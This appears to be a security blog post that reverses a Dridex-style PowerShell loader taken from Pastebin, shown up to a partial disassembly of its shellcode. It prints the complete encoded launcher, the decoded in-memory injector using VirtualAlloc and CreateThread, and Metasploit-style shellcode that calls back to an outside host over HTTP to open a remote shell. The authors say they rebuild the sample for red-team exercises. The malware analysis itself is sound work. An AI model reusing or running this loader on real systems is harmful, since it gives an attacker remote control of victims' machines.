---
layout: post
title:  "Dridex Loader Technique Used For MSF Shells"
date:   2018-01-26 13:49:33 +0000
tags: [malware, reversing, powershell, pentest, redteam, blueteam]
---
![](/blog/assets/msf.png)

Recently we keep seeing this same/simliar payload(s) over and over on Pastebin. Netscylla first came across a similar sample payload in 2016 used in a Dridex campaign targeting corporations via Phishing and fake Invoices which then proceeded to install the infamous banking Trojan. We at Netscylla have on many occasions used this sample to modified it with our own code and thrown it back at Blue Teams during simulated Red Teaming. Below is an outline of how to reverse and rebuild the sample.

A copy of our sample for analysis can be found here:

* [https://pastebin.com/iSdSCfwP](https://pastebin.com/iSdSCfwP)

# Initial Decode
For now we will start from the encoded Powershell (but usually the sample is packaged up further as an obfuscated VBA macro inside a Word Document):
<pre><code>
powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwBIADQAcwBJAEEASAB4AFQAWQBGAG8AQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwAzAEUAcgA5AEQAMQBhAEYAaABKAEUASQAyAEkAUwBrAFQAYQBSAEsAWgAvAE4ATwBnAEEARABHAGQAZwB4AEYAMQBXAEsAdgA3AFkAVwAxAGwAOQBwAHIAMwBuAHIAOQA3AHoAZgBtAEoAUwBHAFgANQBLADcAVgA2AFYAWgBZAHIASABkAG0AZABtAGUAZQBlAFcAYgBIAGIAaABMAGEAbgBMAEIAUQBDAE0AbwBqAFYAZgBqAHgANABmADIANwBQAG8AcABRAEkASQBnAFoALwB2AG4AZQB2ADgAcwBMAEcAUgBvAFAARABHAFYAbAB1AEwAYgBzADUAdAA2ADkAQQA0AFUATQBkAGsAcgBXADIASgA3AE4ASgBPAEcATABJAEUANgBVADUAYgBMAEsAQQBrAFQAQwA2AGUAMQB0AEoAWQBrAGkASABQAEwARABlADYARwBCAHUAUgBMAEgATwBKAGgAUgBnAG0ATQB4AEoALwB3AHAAbQBEADYATwA4AE0AWAA5AGIASQA1AHQATAB2AHcAUQBNAHQAOABLAEQAYwBwAG0AaQBCADcAVgB0AGgAVgBrACsAMQBpADQAVQBFAEkAbgBsAFgAVwBZAGoAVgBMAGYAQwB0AHEAUwBFAGkANQBtAHYAMwA3AE4ANQBpAFkAWAA4AHIAUgBRACsANQA0AGcARwBvAHQAWgBiAFIAdAB6AEgAQgBRAGMAUwByAE0ANQA0AFcAYwB1AFAAWABDADAAWABXAEkAeAAyAHkAVgAyAHgARwBMAG0AOABvAEoASgB3AHMAdABTAFEAUQA5AGoANQBPAEkAZQA3AEwAYgBDAFgAYwB4ADkANQBzAFQAWgBIAEkAUQBDAHYAdwBqAHoASgBBAHEARgBwADYARABTAFgAUQA0ADYAWQBoAGEAbQAvAFkAagBaAGkAdQBOAEUATwBBAGEAVABRAGkAdABjAHMAUQBVAFcATQAyAEYAQwBhAFYANwA0AFEANQB3AGMAWABSAGcAbQBJAFMAYwBCAEIAagBuAEgARQBWAHQAcQBPAEYAbwBSAEcAOABlAEYASgBnAG8AZABpAG8AZgBZAG4AWQBvADkAdgBEADUARgAvAHEAdABHADQAcgBrAFIAYQBQAFYANQBsAE0AdABEAGEAdAA3AHkAdABjAHUAYwBoAE8ASwBEAGUAVABiADMAMAB0AHQARABUAG4ATQB3AC8AcABaAFgAdwBPAEwAbgBoAC8AYwBmADMAcgBzAG4ATgBrAFEATgBVAGoAMQBuAEEAOAB6AGUAVABmAFoAegBEAEwANgBLAGYAUgBhAFQAdgBkADQAWABRAGMAbwBMAFgAVABnAFEAYwBSAFoAdAA0AFQAVQB6AGkAaABLAGMAbQB3AHEAVABOAEIARwBUADYAVgBUAEkAYwBHADAAbgBOADIAYQA5AGEAbABlAHgAOAAyADkAdgBJADUAOQBzAHcARwBMAFoANgBaAFQATAB5ADUASgAxADEAdwBYAEIAeABHAEQARQBtAFkATABoAE0AVgArAFoANwA0ADAAbQBhAHEAZQBDAHQANABsAFgAeABTADQASgBjAFgAVQBiAG8AbwBEAFkASgAyADYASgByADIAVQBBAHUAeABUAHYASQB5ADYAYwAxAEgAcgBnAG0ANQBnADkAQwByAEIAVAB4AFIAUgA3AGkASwBkAHcANQBvAFgASgBTADcATgBhAFEAUABpAGoAcgBaAG8AUQA2AHUAQgBJAHMAUwBHAEwATQBYAGcARgBDAGMANAA5AGQAKwBhAFEASQBUAEgAYgBDAHIAcwA0AEEATQBRAE8ANwAxAGwASQBoAHcAdQBNAHgAaQBmAHQASQA0AHUAMwBwADkAUABUAGQAMQBEAEsAVgBpAGkASwA0ADcAegBRAFQANgBDAGsANwBMAHkAZwBZAFUAUwB4AGsAeABlAFUATQBDAFoASABrAFoASgB3AHQAcAA5AG0AbgA5AHoAdABKAHAAUQBUAEcAOABYADgAdABOADAAMAA5AHcAagBrADgAYwBBAEsAQwAyAE0AZQBKAFQAWgBrAEUAWQBJAGYAYQBVAHQAcwBFADAAUgBUAEwAUABKAEMAawB6AGgAWQAzAFcAcgBFAE8AeAAyAGMAZgBSAFcASgBDAHEASwBVAGgAQgA3AHMAdABJAEoATQB3AEUAcQBLAGcATQBaAFQAYgBrAFQAZwA0AHoAawBQAGMAZwBVAE4AOAAxAGEAdwBwAEQAZwBBADEAWAAyAE4AMQB5AG4AeQBvAEsASwBQAEoAYgBIAG4ARgBQAEsAdwBrADMAMwBoADYAWQBuAHUAQgAyADYAbgBvAEoAegBRAE8AUABNAFQATQBxADEAUgB4AHYATwBDAFEAUwBJAE8AZAAwAFUASwA4AEIATwByAC8AcABNAHoAWgAxAGYARwB3AGEAMQBLAGgASQA4AFoARQBrADkAbABOAEYARwAzAFAAQwBWAC8ASgB0AEwAcQB6AGoAZQBOAG8AVgBIAEsAMQB5AE4AawBlADQAQQBpAEQAdQBEAFUASQB4AGEAbwBLAE0AYgBYAFoAWQAxAEgAQQBKADMANABzAFgAaABQAEsAZwBvAE0AcQB4AFgAUwByAHEAMAB1AGkASwB5AHMAaQBkAHoAcQB3AHEATwBUAHkAeABhAHIAZgBuAEwAdQAyAHYATgBtAE0AYQBwAHUAZgBGAGQAcAB4AGEAMQB1AHMAMQA4AGQATgBKAHYAbABWAFYAcwB6AHkAbAB5AHIAdABmAGgAZAB2ADgAVwA3AHQAWQBmADUAWABGAE8AYQBRADkAMwBpADQANQBiAFMASABCAEYAcABZAFoAVgAzAHkAegBiAFoAYQBSADMARgBzAFQAYgBGADYANQAyADYAVwAwAHYAcQBaAGoAZgAzAEgATgBlAHEAdQBxADcAMwB5AGQAVwBHADgAbABXAGQAZABNAHoASwBRAEoAVgBLAHEARgBPAHQASgBSADEAVABYAGEAdABTAE8AYQA2AFIAZABYAE4AQQA5AE0ARwBpAFgAZQBjAHoAeQA2AEIASQBkADQAdgBlAGcAMwB5AEQAeQBLAFkAVAB6AFEAMgBaAHoAUQBKAEQAVQBoAHIAKwBKAFQASwB2AGwAawBiAEQANwB6AHAAYgBxADEAbQA4ADAAVABjAGwAdQBUAGYAUwA0AFUASABWAHAAWQBtAFIAVwA1AFEATgBtAEgAdQB3AFYAdgBJADEAMAAxAE8AVQA2ADUANgBVAGgAcgBzAGEAMQBSADAAeQBJAGoATABDAGkALwBGAG8AOQBOAEQAcgBtAGEAYQA5AFEAWABRAGMAYQBzAEcANABOAFoAWgB1ACsAdQBPAEgAMQB0AFoAbwB0AEgAVgBMAHQAeQA2AE4AQgAwAHEATQBTADkAVQB5ADYAZgBLACsAWQB3ADUAcgBoAHIAbABaAE8ARAByAFgANwBOAEMANABuAHMAMgBIAGIASwBBADcAbABxAFAANwBxAHoARwBjAFAASgBQADgAZwBiAFAAegBhADgAZwBZAFgAbAB0AEIAZgBXADcAcwBlAGsAYgBIAE4AQgBBAEsAMgBzAHgAYQBxAHcATgBVAHgAKwAzAHcAOAA2AHcAbwBXADIARgBEAEwAMwBsAEsATgA2AG4AVQBVAG4AOABOAHUAVwBlAGkAZQAyADUAMAA1AHEAdQBpAFAAQgA1AC8AcgA5AEEAYgA1AGcARgBaAGwARgBiAG8ASQBXADgANABRAFAANgBOAGkAWgBwAEcASQAyAFMAegBmAFUAeAA2AHEAbAArAFIARwBvADAAbQA2AEYAcwBQAGkAagBQAHcAKwA0ADQAVABNAGgAMQBpAFYAQgBwAEwAQgBTAG4ASwBRAEYARgBVAEIAbwArAGkAMQBIAHYATQB2AEIAdQBPAHIAdAB5AGkAcwBZAEMAegBDAEgAWQBlAFEAQQA2AGEANgBzAGcASQBQAE8AQgB0AFMASQBvADMAWgBuADMAZABIAFAAWABKADIAbABiAFgAWgBkAGcAUABHADkAWgBhAEwAagBLAG4AQwBPAE8AUwArAGgARABMAHcAagBMAGIAZgBuAGQAVQAyADMAUQBDAGYAMgBVADMAaAA2AHQATwBjAEwATQBkAHIAeQB1AGYAUABuAGQATQBZAGcAUgBNADAAWQB0AEYANAAyAFAASwBXAEsAQgBzAEoAbABiAG4ARABYAE8AbgBmADcAdQA2ADIAcAAxAFIAOABhADAARwAxAEUAVgBSADcAQwBNAEsARgBJAFcAbQBjAHIAbwAwADYAaQB5AHEASAA5AHQARABuADUASABVAFEAaABUADMASAB3ADAATABIAEkAVwBZAFEAcABlAEYAUABuAHcAcQBPAEkAVgBTAFoAcQBlADkAYQB0ADkASQBvAEUAOABlAHUAdABjAFUAYgBnADQAZABwAHAAZQBsAFYAMgBjADUANABWAEUAeAA5ADkAUwArAFQAawB1ADMAdAAyAFAAdwBFAG8AcgAzAHMAYQBvAEsASABSAHgANgAzAE0AOQBMAG0AMAB0AEoAZwBrAFkAawBiAGMAbwBTAFIAUAB6AHIANABWAFgAWQBjAGkAcwArADcAWgBkAFAAdQA5AGsANQBWAHMAOABPAG8ALwB2AEQAYwBtAG0AQgBaADkAaAA0ADAANABJADcASgBsAEMARAArAC8AOABYAHoAKwBQAHQANABzAE8AZgA4ADIAOQA0AFAAcQAzADkAZwAvAFMAWABNAEoAYgB5AHoAMQBCADQASQBYADIAKwA4AEYAdQBRAC8AegBZAEMASgBpAEkAYwBOAEQAVwA0AEkAQwBrACsAdABPAC8AWABnAFQAaAB5ADYATwB5ADcANQB5AHgATAB3AEIASAAzAE8ATgBJAFAAMABmAHUARQBYAC8AVABnAHEAKwBnAHYAYwBZADYATAB5AGYAOABLAEEAQQBBAD0AJwAnACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7ACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
</code></pre>
On Windows Defender this payload is immediately flagged as Powershell/Ploty.E!

First we decode the sample using Base64 and UTF-16LE (http://gchq.github.io/CyberChef) can make quick work of this!

Or use the following Linux/OSX command line:
<pre>
base64 -d sample | iconv -f UTF-16LE -t UTF-8
</pre>
# More Decoding…
<pre>
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAHxTYFoCA7VWbW/aSBD+3Er9D1aFhJEI2ISkTaRKZ/NOgADGdgxF1WKv7YW1l9pr3nr97zfmJSGX5K7V6VZYrHdmdmeeeWbHbhLanLBQCMojVfjx4f27PopQIIgZ/vnev8sLGRoPDGVluLbs5t69A4UMdkrW2J7NJOGLIE6U5bLKAkTC6e1tJYkiHPLDe6GBuRLHOJhRgmMxJ/wpmD6O8MX9bI5tLvwQMt8KDcpmiB7VthVk+1i4UEInlXWYjVLfCtqSEi5mv37N5iYX8rRQ+54gGotZbRtzHBQcSrM54WcuPXC0XWIx2yV2xGLm8oJJwstSQQ9j5OIe7LbCXcx95sTZHIQCvwjzJAqFp6DSXQ46Yham/YjZiuNEOAaTQitcsQUWM2FCaV74Q5wcXRgmIScBBjnHEVtqOFoRG8eFJgodiofYnYo9vD5F/qtG4rkRaPV5lMtDat7ytcuchOKDeTb30ttDTnMw/pZXwOLnh/cf3rsnNkQNUj1nA8zeTfZzDL6KfRaTvd4XQcoLXTgQcRZt4TUzihKcmwqTNBGT6VTIcG0nN2a9alex829vI59swGLZ6ZTLy5J11wXBxGDEmYLhMV+Z740maqeCt4lXxS4JcXUbooDYJ26Jr2UAuxTvIy6c1Hrgm5g9CrBTxRR7iKdw5oXJS7NaQPijrZoQ6uBIsSGLMXgFCc49d+aQITHbCrs4AMQO71lIhwuMxiftI4u3p9PTd1DKViiK47zQT6Ck7LygYUSxkxeUMCZHkZJwtp9mn9ztJpQTG8X8tN009wjk8cAKC2MeJTZkEYIfaUtsE0RTLPJCkzhY3WrEOx2cfRWJCqKUhB7stIJMwEqKgMZTbkTg4zkPcgUN81awpDgA1X2N1ynyoKKPJbHnFPKwk33h6YnuB26noJzQOPMTMq1RxvOCQSIOd0UK8BOr/pMzZ1fGwa1KhI8ZEk9lNFG3PCV/JtLqzjeNoVHK1yNke4AiDuDUIxaoKMbXZY1HAJ34sXhPKgoMqxXSrq0uiKysidzqwqOTyxarfnLu2vNmMapufFdpxa1us18dNJvlVVszylyrtfhdv8W7tYf5XFOaQ93i45bSHBFpYZV3yzbZaR3FsTbF6526W0vqZjf3HNequq73ydWG8lWddMzKQJVKqFOtJR1TXatSOa6RdXNA9MGiXeczy6BId4veg3yDyKYTzQ2ZzQJDUhr+JTKvlkbD7zpbq1m80TcluTfS4UHVpYmRW5QNmHuwVvI101OU656Uhrsa1R0yIjLCi/Fo9NDrmaa9QXQcasG4NZZu+uOH1tZotHVLty6NB0qMS9Uy6fK+Yw5rhrlZODrX7NC4ns2HbKA7lqP7qzGcPJP8gbPza8gYXltBfW7sekbHNBAK2sxaqwNUx+3w86woW2FDL3lKN6nUUn8NuWeie2505quiPB5/r9Ab5gFZlFboIW84QP6NiZpGI2SzfUx6ql+RGo0m6FsPijPw+44TMh1iVBpLBSnKQFFUBo+i1HvMvBuOrtyisYCzCHYeQA6a6sgIPOBtSIo3Zn3dHPXJ2lbXZdgPG9ZaLjKnCOOS+hDLwjLbfndU23QCf2U3h6tOcLMdryufPndMYgRM0YtF42PKWKBsJlbnDXOnf7u62p1R8a0G1EVR7CMKFIWmcro06iyqH9tDn5HUQhT3Hw0LHIWYQpeFPnwqOIVSZqe9at9IoE8eutcUbg4dppelV2c54VEx99S+Tku3t2PwEor3saoKHRx63M9Lm0tJgkYkbcoSRPzr4VXYcis+7ZdPu9k5Vs8Oo/vDcmmBZ9h404I7JlCD+/8Xz+Pt4sOf8294Pq39g/SXMJbyz1B4IX2+8FuQ/zYCJiIcNDW4ICk+tO/XgThy6Oy75yxLwBH3ONIP0fuEX/Tgq+gvcY6Lyf8KAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
Another Defender Alert:Plasti.A!
</pre>
# Even More decoding…
I bolded IO.Compression.GzipStream above, as sometimes the Threat actors replace this with inflate, zlib or other supported (de)compression algorithms, becare here, or you will end up with gibberish rather than the sample:
<pre>
<code>
function m4TB {
	Param ($t8OhK, $lsQVAvVfc1f)		
	$ed2YZcbb0 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $ed2YZcbb0.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ed2YZcbb0.GetMethod('GetModuleHandle')).Invoke($null, @($t8OhK)))), $lsQVAvVfc1f))
}

function rGiD {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $tSz1GbNDMAc,
		[Parameter(Position = 1)] [Type] $pLL44p2YKM = [Void]
	)
	
	$qGHaJ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$qGHaJ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $tSz1GbNDMAc).SetImplementationFlags('Runtime, Managed')
	$qGHaJ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $pLL44p2YKM, $tSz1GbNDMAc).SetImplementationFlags('Runtime, Managed')
	
	return $qGHaJ.CreateType()
}

[Byte[]]$rSFd_SoaT = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1obmV0AGh3aW5pVGhMdyYH/9Ux21NTU1NTaDpWeaf/1VNTagNTU2hSWgAA6N0AAAAvTFdiTi1aekZTTXNNWWcxalZnSmZIZ09PZXIyVGJUYUY3VXliV3BYWlpOLWREVWxkdUtScnV6bjRoQUdYdUhvZTU1b0hQdzhEaVR6YmFjVzNVLWVaamJoYwBQaFeJn8b/1YnGU2gAMuCEU1NTV1NWaOtVLjv/1ZZqCl9ogDMAAIngagRQah9WaHVGnob/1VNTU1NWaC0GGHv/1YXAdQhPddnoUgAAAGpAaAAQAABoAABAAFNoWKRT5f/Vk1NTiedXaAAgAABTVmgSloni/9WFwHTPiwcBw4XAdeVYw1/od////3lhYmFkYWJhMTExLmhvcHRvLm9yZwC78LWiVmoAU//V")
		
$sBjGWzU_55z = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((m4TB kernel32.dll VirtualAlloc), (rGiD @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $rSFd_SoaT.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($rSFd_SoaT, 0, $sBjGWzU_55z, $rSFd_SoaT.length)

$oZxIewSmBmO = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((m4TB kernel32.dll CreateThread), (rGiD @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$sBjGWzU_55z,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((m4TB kernel32.dll WaitForSingleObject), (rGiD @([IntPtr], [Int32]))).Invoke($oZxIewSmBmO,0xffffffff) | Out-Null
</code>
</pre>
This next bit is not so difficult, a straight base-64 decode. The code above should look familiar as its used by many Powershell exploit kits, and also a very similar version exists in Empire.

Base64 decoding the Base64String leaves us with the following binary stub code:
<pre>
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368525a0000e8dd0000002f4c57624e2d5a7a46534d734d5967316a56674a6648674f4f6572325462546146375579625770585a5a4e2d6444556c64754b5272757a6e346841475875486f6535356f485077384469547a6261635733552d655a6a62686300506857899fc6ffd589c653680032e08453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c075084f75d9e8520000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe877ffffff79616261646162613131312e686f70746f2e6f726700bbf0b5a2566a0053ffd5
</pre>
The start of the hex dump is very familiar and looks like a 32-bit Windows payload commonly supplied from Metasploit or Cobalt-Strike. We use the Open-source tool Radare2 to reverse this code into assembler to verify the library calls, and any socket connections.

I like to use the following command to dissassemble payloads:
<pre>
cat sample |xxd -pr|awk '{printf "%s", $0}'|xargs rasm2 -a x86 -D
</pre>
# Raw Payload Analysis
We have added a few comments e.g. ; hash(“kernel32.dll”,”LoadLibraryA”)to the the code to make this analysis, easier for newer members of the Team:
<pre>
MD5(../../sample.bin.data)= a729ceb472eaa8a0912cd5869b2b4f28
SHA1(../../sample.bin.data)= 4f4e859a56091c0d0cbf4fcfd9e7e07b4d9fbba1
cat sample |xxd -pr|awk '{printf "%s", $0}'|xargs rasm2 -a x86 -D
0x00000000   1                       fc  cld
0x00000001   5               e882000000  call 0x88
0x00000006   1                       60  pushad
0x00000007   2                     89e5  mov ebp, esp
0x00000009   2                     31c0  xor eax, eax
0x0000000b   4                 648b5030  mov edx, [fs:eax+0x30]
0x0000000f   3                   8b520c  mov edx, [edx+0xc]
0x00000012   3                   8b5214  mov edx, [edx+0x14]
0x00000015   3                   8b7228  mov esi, [edx+0x28]
0x00000018   4                 0fb74a26  movzx ecx, word [edx+0x26]
0x0000001c   2                     31ff  xor edi, edi
0x0000001e   1                       ac  lodsb
0x0000001f   2                     3c61  cmp al, 0x61
0x00000021   2                     7c02  jl 0x25
0x00000023   2                     2c20  sub al, 0x20
0x00000025   3                   c1cf0d  ror edi, 0xd
0x00000028   2                     01c7  add edi, eax
0x0000002a   2                     e2f2  loop 0x10000001e
0x0000002c   1                       52  push edx
0x0000002d   1                       57  push edi
0x0000002e   3                   8b5210  mov edx, [edx+0x10]
0x00000031   3                   8b4a3c  mov ecx, [edx+0x3c]
0x00000034   4                 8b4c1178  mov ecx, [ecx+edx+0x78]
0x00000038   2                     e348  jecxz 0x82
0x0000003a   2                     01d1  add ecx, edx
0x0000003c   1                       51  push ecx
0x0000003d   3                   8b5920  mov ebx, [ecx+0x20]
0x00000040   2                     01d3  add ebx, edx
0x00000042   3                   8b4918  mov ecx, [ecx+0x18]
0x00000045   2                     e33a  jecxz 0x81
0x00000047   1                       49  dec ecx
0x00000048   3                   8b348b  mov esi, [ebx+ecx*4]
0x0000004b   2                     01d6  add esi, edx
0x0000004d   2                     31ff  xor edi, edi
0x0000004f   1                       ac  lodsb
0x00000050   3                   c1cf0d  ror edi, 0xd
0x00000053   2                     01c7  add edi, eax
0x00000055   2                     38e0  cmp al, ah
0x00000057   2                     75f6  jnz 0x10000004f
0x00000059   3                   037df8  add edi, [ebp-0x8]
0x0000005c   3                   3b7d24  cmp edi, [ebp+0x24]
0x0000005f   2                     75e4  jnz 0x100000045
0x00000061   1                       58  pop eax
0x00000062   3                   8b5824  mov ebx, [eax+0x24]
0x00000065   2                     01d3  add ebx, edx
0x00000067   4                 668b0c4b  mov cx, [ebx+ecx*2]
0x0000006b   3                   8b581c  mov ebx, [eax+0x1c]
0x0000006e   2                     01d3  add ebx, edx
0x00000070   3                   8b048b  mov eax, [ebx+ecx*4]
0x00000073   2                     01d0  add eax, edx
0x00000075   4                 89442424  mov [esp+0x24], eax
0x00000079   1                       5b  pop ebx
0x0000007a   1                       5b  pop ebx
0x0000007b   1                       61  popad
0x0000007c   1                       59  pop ecx
0x0000007d   1                       5a  pop edx
0x0000007e   1                       51  push ecx
0x0000007f   2                     ffe0  jmp eax
0x00000081   1                       5f  pop edi
0x00000082   1                       5f  pop edi
0x00000083   1                       5a  pop edx
0x00000084   2                     8b12  mov edx, [edx]
0x00000086   2                     eb8d  jmp 0x100000015
0x00000088   1                       5d  pop ebp
0x00000089   5               686e657400  push 0x74656e
0x0000008e   5               6877696e69  push 0x696e6977 ; wininet,0
0x00000093   1                       54  push esp
0x00000094   5               684c772607  push 0x726774c ; hash("kernel32.dll","LoadLibraryA")
0x00000099   2                     ffd5  call ebp
0x0000009b   2                     31db  xor ebx, ebx
0x0000009d   1                       53  push ebx
0x0000009e   1                       53  push ebx
0x0000009f   1                       53  push ebx
0x000000a0   1                       53  push ebx
0x000000a1   1                       53  push ebx
0x000000a2   5               683a5679a7  push 0xa779563a ; hash("wininet.dll","InternetOpenA")
0x000000a7   2                     ffd5  call ebp
0x000000a9   1                       53  push ebx
0x000000aa   1                       53  push ebx
0x000000ab   2                     6a03  push 0x3
0x000000ad   1                       53  push ebx
0x000000ae   1                       53  push ebx
0x000000af   5               68525a0000  push 0x5a52
0x000000b4   5               e8dd000000  call 0x196
0x000000b9   1                       2f  das
0x000000ba   1                       4c  dec esp
0x000000bb   1                       57  push edi
0x000000bc   3                   624e2d  bound ecx, [esi+0x2d]
0x000000bf   1                       5a  pop edx
0x000000c0   2                     7a46  jp 0x108
0x000000c2   1                       53  push ebx
0x000000c3   1                       4d  dec ebp
0x000000c4   2                     734d  jae 0x113
0x000000c6   1                       59  pop ecx
0x000000c7   4                 67316a56  xor [bp+si+0x56], ebp
0x000000cb   2                     674a  a16 dec edx
0x000000cd   2                     6648  dec ax
0x000000cf   2                     674f  a16 dec edi
0x000000d1   1                       4f  dec edi
0x000000d2   3                   657232  jb 0x107
0x000000d5   1                       54  push esp
0x000000d6   4                 62546146  bound edx, [ecx+0x46]
0x000000da   1                       37  aaa
0x000000db   1                       55  push ebp
0x000000dc   2                     7962  jns 0x140
0x000000de   1                       57  push edi
0x000000df   2                     7058  jo 0x139
0x000000e1   1                       5a  pop edx
0x000000e2   1                       5a  pop edx
0x000000e3   1                       4e  dec esi
0x000000e4   5               2d6444556c  sub eax, 0x6c554464
0x000000e9   3                   64754b  jnz 0x137
0x000000ec   1                       52  push edx
0x000000ed   2                     7275  jb 0x164
0x000000ef   2                     7a6e  jp 0x15f
0x000000f1   2                     3468  xor al, 0x68
0x000000f3   1                       41  inc ecx
0x000000f4   1                       47  inc edi
0x000000f5   1                       58  pop eax
0x000000f6   2                     7548  jnz 0x140
0x000000f8   1                       6f  outsd
0x000000f9   6             6535356f4850  xor eax, 0x50486f35
0x000000ff   2                     7738  ja 0x139
0x00000101   1                       44  inc esp
0x00000102   8         69547a6261635733  imul edx, [edx+edi*2+0x62], 0x33576361
0x0000010a   1                       55  push ebp
0x0000010b   5               2d655a6a62  sub eax, 0x626a5a65
0x00000110   5               6863005068  push 0x68500063
0x00000115   1                       57  push edi
0x00000116   6             899fc6ffd589  mov [edi-0x762a003a], ebx
0x0000011c   1                       c6  invalid
0x0000011d   1                       53  push ebx
0x0000011e   5               680032e084  push 0x84e03200 ; hash("wininet.dll", "HttpOpenRequestA”)
0x00000123   1                       53  push ebx
0x00000124   1                       53  push ebx
0x00000125   1                       53  push ebx
0x00000126   1                       57  push edi
0x00000127   1                       53  push ebx
0x00000128   1                       56  push esi
0x00000129   5               68eb552e3b  push 0x3b2e55eb ; hash("wininet.dll","HttpOpenRequestA")
0x0000012e   2                     ffd5  call ebp
0x00000130   1                       96  xchg esi, eax
0x00000131   2                     6a0a  push 0xa
0x00000133   1                       5f  pop edi
0x00000134   5               6880330000  push 0x3380
0x00000139   2                     89e0  mov eax, esp
0x0000013b   2                     6a04  push 0x4
0x0000013d   1                       50  push eax
